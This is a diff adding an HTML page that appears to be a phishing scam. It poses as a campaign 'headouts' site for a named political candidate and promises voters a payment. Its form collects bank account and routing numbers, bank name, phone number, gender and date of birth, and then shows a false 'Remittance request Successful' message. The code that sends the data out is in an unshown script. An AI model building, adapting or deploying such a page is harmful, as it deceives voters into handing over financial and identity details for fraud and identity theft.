@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/jpg" href="images/capitol_politics_logo-removebg-preview.png">
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Nonpartisan Campaign Headouts</title>
+<!-- html2canvas CDN for export (works offline if you host the library locally) -->
+ <script src="https://kit.fontawesome.com/73be9fb684.js" crossorigin="anonymous"></script>
+</head>
+<body>
+  <div class="blurcover" id="finishingmesseg">
+    <div class="innercon">
+        <div class="shrinker">
+
+            <div class="topcircle">
+                <div class="loweercircl">
+                    <div>
+                      <i class="fa-solid fa-check checkcircl"></i>
+                    </div>
+                </div>
+              </div>
+                <p class="h1weigt">Remittance request Successful</p>
+                <p class="h3weight">You may now close this page. We assure you that you will receive your payment within 4–6 working days. We kindly ask for your patience, as there is a queue of pending payments and our team is working diligently to ensure that everyone receives theirs as quickly as possible.</p>
+          
+        </div>
+    </div>
+  </div>
+
+
+<div class="wrap">
+  <div class="controls" aria-labelledby="controls-title">
+    <h2 id="controls-title">Voters / Supporters Bank information (Beneficiary info)</h2>
+
+    <label>Voters / Supporters name
+      <input id="candidateName" type="text" value="Voters / Supporters Name" placeholder="Type a name..." style="border: 1px solid rgb(119, 119, 119); max-width: 95%;">
+    </label>
+
+    <label>Voters / Supporters Phone Number
+      <input id="slogan" type="text" value="Voters / Supporters Phone Number" placeholder="+123456789" style="border: 1px solid rgb(119, 119, 119); max-width: 95%">
+    </label>
+
+    
+
+    
+
+    <label>Beneficiary Account Details
+      <div class="size-presets" role="list">
+        <input class="preset active2" type="text" placeholder="Account Number" style="border: 1px solid rgb(119, 119, 119);" id="Accountnumber">
+        <input class="preset active2" type="text" placeholder="Routing Number" style="border: 1px solid rgb(119, 119, 119);" id="portingnumber">
+        <input class="preset active2" type="text" placeholder="Bank Name" style="border: 1px solid rgb(119, 119, 119);" id="bankname">
+        <input class="preset active2" type="text" placeholder="State" style="border: 1px solid rgb(119, 119, 119);" id="Nationality">
+      </div>
+    </label>
+
+    <label>Gender
+      <select id="bgStyle">
+        <option value="Male">Male</option>
+        <option value="Female">Female</option>
+        <option value="Others">Others</option>
+      </select>
+    </label>
+
+    <label>Date Osf Birth (mm/dd/yyyy)
+      <input id="accentColor" type="text" placeholder="00/00/2025" class="preset active2" style="border: 1px solid rgb(119, 119, 119); max-width: 95%">
+    </label>
+
+    <div style="margin-top:12px; display: flex;">
+      <button id="downloadBtn" class="btn">Submite</button>
+      <button id="resetLogo" class="btn canclebnt">Cancle</button>
+    </div>
+
+    <div class="note">This event is paid for and authorized by <span class="candname">Candidate Name</span>, candidates for public office.</div>
+  </div>
+
+  <div class="preview-wrap">
+    <h2 style="margin:0 0 6px">Campaign Headouts</h2>
+    <div class="preview-area" id="previewArea">
+      <!-- This is the card that html2canvas will capture -->
+      <div id="exportCard" class="card" role="img" aria-label="Campaign template preview">
+        <div class="left">
+          <div style="display:flex;align-items:center;gap:14px">
+            <div class="logo-outer" id="logoOuter" aria-hidden="true">
+              <img src="https://raw.githubusercontent.com/chase-advocacy/images/refs/heads/main/katie%20porter.png" alt="" style=" width: 350px; height: 350px; object-fit: cover; object-position: center; border-radius: 15px;">
+              <!-- <span id="logoPlaceholder" style="font-size:13px;color:var(--muted)">Logo</span> -->
+            </div>
+            <div>
+              <h1 id="namePreview" class="candidate-name candname">Candidate Name</h1>
+              <p id="sloganPreview" class="slogan">Community support & programs</p>
+            </div>
+          </div>
+
+          <div style="margin-top:14px">
+            <p class="meta small">Informational mockup — <span class="candname">Candidate Name</span> political party for previews</p>
+            <div id="donationPill" class="donation-pill">Community Assistance • Learn more</div>
+          </div>
+        </div>
+
+        <div class="right">
+          <div style="text-align:center">
+            <img src="https://raw.githubusercontent.com/chase-advocacy/images/refs/heads/main/katies%20porter%20logo.png" alt="" style=" width: 350px; height: 350px; object-fit: cover; object-position: center; border-radius: 15px;">
+          </div>
+        </div>
+
+        <div class="footer-strip">
+          <div class="small"><span class="candname">Candidate Name</span> Neutral template • Created for mockups</div>
+        </div>
+      </div>
+      <!-- End card -->
+    </div>
+
+    <div style="display:flex;gap:10px;align-items:center">
+      <div><strong>Vote</strong></div>
+      <div class="small">for <em class="candname">katies porterk</em> to keep america safe and strong.</div>
+    </div>
+  </div>
+</div>
+
+<script src="index.js" type="module"></script>
+</body>
+</html>
